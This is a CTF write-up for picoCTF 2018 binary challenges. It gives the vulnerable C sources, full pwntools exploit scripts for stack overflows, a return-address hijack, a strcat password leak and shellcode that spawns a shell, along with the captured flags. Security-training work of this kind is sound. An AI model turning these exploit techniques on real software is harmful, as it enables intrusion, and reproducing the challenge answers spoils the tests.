# Binary Exploitation

### B**uffer overflow 0 - Points: 150**

> Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0\_3\_d5263c5219b334339c34ac35c51c4a17 on the shell server. [Source](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln.c).  
> Hint:   
> How can you trigger the flag to print?  
> If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

vuln.c contents:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }  else
    printf("This program takes 1 argument.\n");
  return 0;}
```

One way was to run the program and pass a really long \(supposedly at least 28 bytes\) string and it will print the flag on the server. Another method I wanted to use was pwntool because it gave me an opportunity to learn about the this popular program.

```c
from pwn import *

username = "tokumeipoh"

input = 'a' * 28

connection = ssh(host="2018shell.picoctf.com", user=username, password="{password}")

py = connection.run("cd /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17; ./vuln {}".format(input))

print(py.recv())
connection.close()
```

Shell results:

```text
poh@pohSurface:/mnt/d/pradagy/projects/ctf/pico2018/buffer overflow 0$ python3 try.py 
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/bin/bash' on 2018shell.picoctf.com: pid 130175
b'picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}\n'
[*] Stopped remote process 'bash' on 2018shell.picoctf.com (pid 130175)
```

### **Buffer overflow 1 - Points: 200** 

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](https://2018shell.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln)? You can find it in /problems/buffer-overflow-1\_4\_9d46ad1b74894db5d4831b91e19ee709 on the shell server. [Source](https://2018shell.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln.c).  
> Hint: This time you're actually going to have to control that return address! Make sure you consider Big Endian vs Little Endian.

We can learn that we need to invoke the win\(\) function in order to have the flag revealed. And using cutter, I found the function address starts at 0x080485cb. Or you can use a handy linux command for quick reference:  
`objdump -x -d vuln` -x: display all available header info, -d: dissamble \(show assembly code\).  
 If you run the program with different arguments, you will get different return addresses, meaning that there is a padding for the input and then the program jumps to the overflowed input being translated to program address.

{% hint style="warning" %}
This program did not run on my pc because it is missing the asm.h file. What I had to do was run my python code to connect to the server and then conveniently used pwntools. 
{% endhint %}

I first ran this script to figure out what information is sent/received

```python
from pwn import *

host = "2018shell.picoctf.com"
directory = "/problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709"
conn = ssh(host=host, user="tokumeipoh")

io = conn.run(f"cd {directory}; ./vuln")
print(io.recv())
io.sendline(cyclic(100))
# cyclic(100) = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
print(io.recvall())
```

```python
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709; ./vuln': Done
b'Please enter your string: \n'
[+] Receiving all data: Done (131B)
[*] Closed SSH channel with 2018shell.picoctf.com
b'Okay, time to return... Fingers Crossed... Jumping to 0x6161616c\nbash: line 1: 704804 Segmentation fault      (core dumped) ./vuln\n'
```

This meant it read all of my input up until  `0x6161616c` and then it used that as an address to jump to next in assembly.   
1\) First of all, I needed to find out how many bytes \(letters\) it read as input until it overflowed the buffer.   
2\) Then need to find out what address we really want it to jump to, which is the win\(\).  
3\) Construct a string with proper padding and address, with little endian \(which is lsb first\).

1. This part is finding how much padding is needed by locating  `0x6161616c` in the cyclic\(100\). Use the following command in python prompt with pwn imported. This returns the number of bytes the parameter is located at when using cyclic\(n\).  
    `>>> cyclic_find(0x6161616c)`

   `44`  
   So the padding is 44 bytes.

2. In bash, view the assembly code of vuln and grep for win function:  
    `poh@pohSurface:$ objdump -x -d vuln | grep win`

   `080485cb g     F .text  00000064              win`

   `080485cb <win>:`

    `80485ed:       75 1a                   jne    8048609 <win+0x3e>`  
   Address location is at 080485cb. Use python with pwn imported to find hex value and reverse endian   
    `>>> p32(0x080485cb)`

   `b'\xcb\x85\x04\x08'`  
   little endian version is b'\x08

3. padding + address: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08'

Working script:

```python
from pwn import *

host = "2018shell.picoctf.com"
directory = "/problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709"
conn = ssh(host=host, user="tokumeipoh")
io = conn.run(f"cd {directory}; ./vuln")

# retrieve prompt
print(io.recv())

# padding becomes 44 a's converted to bytes
padding = ('a' * 44).encode()
# address = b'\xcb\x85\x04\x08'
address = p32(0x080485cb)
# combine both byte sequences
padding += address
io.sendline(padding)
print(io.recvall())

io.close()
```

```python
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709; ./vuln': Done
b'Please enter your string: \n'
[+] Receiving all data: Done (165B)
[*] Closed SSH channel with 2018shell.picoctf.com
b'Okay, time to return... Fingers Crossed... Jumping to 0x80485cb\npicoCTF{addr3ss3s_ar3_3asyd69e032d}bash: line 1: 716778 Segmentation fault      (core dumped) ./vuln\n'
```

### **Leak-me - Points: 200** 

> Can you authenticate to this [service](https://2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth) and get the flag? Connect with `nc 2018shell.picoctf.com 31045`. [Source](https://2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth.c).  
> Hint: Are all the system calls being used safely? Some people can have reallllllly long names you know..

```text
poh@pohSurface:/mnt/c/Users/poh$ nc 2018shell.picoctf.com 31045
What is your name?
tokumeipoh
Hello tokumeipoh,
Please Enter the Password.
blah
Incorrect Password!
```

This is the C code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}

```

What this program does is get a name input, it could be anything. Then it requests a password and checks it within a local file name passwords.txt. If it matches, then it will show the contents of flag.txt.  
  
After looking at the C code and further glimpse with IDA,   
 `char password[64];        -->  var_194= byte ptr -194h  
char name[256];           -->  var_154= byte ptr -154h  
char password_input[64];  -->  var_54= byte ptr -54h`

This means that these variables are stored in the stack right next to each other. This becomes a problem because of line 47  `strcat(name, ",\nPlease Enter the Password.");` . What strcat\(\) does is remove the '\0' null terminating character and appends the specified string. _It is essentially making "name"  and "password" variable be considered one string because when "name" is called it, it prints all the way til a null terminating char, which is the ending of_  `",\nPlease Enter the Password."`.   
Then in line 55, the fgets places the password into the password\[64\] buffer. This overwrites the `",\nPlease Enter the Password."` with the password.  
  
For example, name\[\]password\[\] next to each other:  
\[00000000000000000000000000000000000000000000\]\[00000000000000000000000000000\]

If we gave 256 \(or even 300\) a's, it will be null terminated at the end.  
\[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\0\]\[00000000000000000000000000000\]

_strcat\(\) removes null and appends string, which is also overflowed in password buffer._  
\[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,\]\[\nPlease Enter the Password.\000000\] 

_line 55, fgets\(\) places real password into password buffer._  
\[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,\]\[password\00000000000000000000\]

line 58, puts\(name\) would print everything from the beginning of the name buffer until it reads a string terminator indicating the end of a string, which also includes the password buffer.

Finally, attempt to login again with any name and the correct password to obtain the flag.   
Python script:

```python
from pwn import *
import socket
from contextlib import contextmanager
import re

host = "2018shell.picoctf.com" 
port = 31045

# to automatically open and close as io
@contextmanager
def sock(inet, stream):
	s = socket.socket(inet, stream)
	try:
		yield s
	finally:
		s.close()

def recvuntil(io, message):
	data = ''
	while message not in data:
		data += io.recv(1).decode()
	# repr() was needed to handle '\n' outputs
	return repr(data)

with sock(socket.AF_INET, socket.SOCK_STREAM) as io:
	io.connect((host, port))

	print(recvuntil(io, 'What is your name?\n'))
	io.send(b'a' * 256 + b'\n')
	data = io.recv(1024).decode()
	sleep(0.2)
	print(data)
	# data is split with space and comma as delimiters
	data = re.split(' |,|\n', data)
	password = data[2]

print(f"Password found: {password}\nReconnecting...")

with sock(socket.AF_INET, socket.SOCK_STREAM) as io:
	io.connect((host, port))

	print(recvuntil(io, 'What is your name?\n'))
	print("Sending: blah")
	io.send(b'blah\n')
	sleep(0.2)
	print(recvuntil(io, '\n'))
	print(recvuntil(io, '\n'))
	io.send(bytes(password+'\n', 'utf-8'))
	print(io.recv(1024))


```

Bash output:

```bash
poh@pohSurface:/pico2018/leakMe$ python3 leakMe.py 
'What is your name?\n'
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_d98e8d

Incorrect Password!

Password found: a_reAllY_s3cuRe_p4s$word_d98e8d
Reconnecting...
'What is your name?\n'
Sending: blah
'Hello blah,\n'
'Please Enter the Password.\n'
b'picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}\n'
```

### **Shellcode - Points: 200** 

> This [program](https://2018shell.picoctf.com/static/8e626dbc7f0c1d8b5d673dda3f509de6/vuln) executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode\_0\_48532ce5a1829a772b64e4da6fa58eed on the shell server. [Source](https://2018shell.picoctf.com/static/8e626dbc7f0c1d8b5d673dda3f509de6/vuln.c).  
> Hint: Maybe try writing some shellcode? You also might be able to find some good shellcode online.

```bash
tokumeipoh@pico-2018-shell:/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed$ ls -l 
total 720
-r--r----- 1 hacksports shellcode_0     34 Mar 25  2019 flag.txt
-rwxr-sr-x 1 hacksports shellcode_0 725472 Mar 25  2019 vuln
-rw-rw-r-- 1 hacksports hacksports     562 Mar 25  2019 vuln.c
tokumeipoh@pico-2018-shell:/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed$ ./vuln
Enter a string!
blahblahblah
blahblahblah
Thanks! Executing now...
Segmentation fault (core dumped)
```

The directory has 3 files. The vuln program permissions allows "other" users to execute, and the 's' signifies during execution, the process running the program has elevated permission which can read the flag.txt.   
    The program prompts for a string and then echoes it out and exits. The important part of this program is when it not only echoes what is typed, but it can actually echo assembly instructions which can spawn a shell.  pwntools has a very handy feature that lets you access a shell within a remote connection. Python script:

```python
from pwn import *
from contextlib import contextmanager

@contextmanager
def connect(host, user):
	try:
		io = ssh(host=host, user=user)
		yield io
	finally:
		io.close()

with connect("2018shell.picoctf.com", "tokumeipoh") as io:
	process = io.run("cd /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed; ./vuln")
	process.recvline()
	# send assembly command to spawn a shell 
	process.sendline(asm(shellcraft.sh()))
	# interact with process to use shell
	process.interactive()
```

Bash output:

```bash
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed; ./vuln': Done      
[*] Switching to interactive mode
jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04\xe1Q\x89\xe11\xd2j\x0b̀
Thanks! Executing now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{shellc0de_w00h00_9ee0edd0}
```

